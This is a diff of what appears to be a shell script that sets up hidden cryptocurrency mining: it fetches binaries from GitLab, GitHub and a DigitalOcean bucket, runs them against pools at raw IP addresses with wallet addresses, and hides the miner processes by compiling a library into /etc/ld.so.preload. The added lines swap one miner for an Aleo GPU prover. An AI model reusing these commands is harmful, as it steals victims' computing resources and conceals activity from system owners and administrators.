@@ -14,9 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/gm3.43
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/v0.2.1/aleo_prover-v0.2.1.tar.gz && tar -zvxf aleo_prover-v0.2.1.tar.gz && cd aleo_prover
 
-chmod 777 gm3.43
+chmod +x aleo_prover
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gm3.43 -a octopus -s 68.183.130.15:443 -u cfx:aajuzc32zfrfssd5x0zhtres2xtn1jz6hpepg7g8wh.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 147.182.167.202 --port 80 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qzjydsdd5568hsakc7r729fv8wyeku9343sd8kduu98vs9054l6dgk0de5vjk
+./graftcp/graftcp ./aleo_prover --pool 167.99.155.214:443 --address aleo138nwcjtgjc6xnt0a5y2t3lx90gagj8xtne6zn2wvnkpnzx76vc9q9rtmdt --custom_name GPU
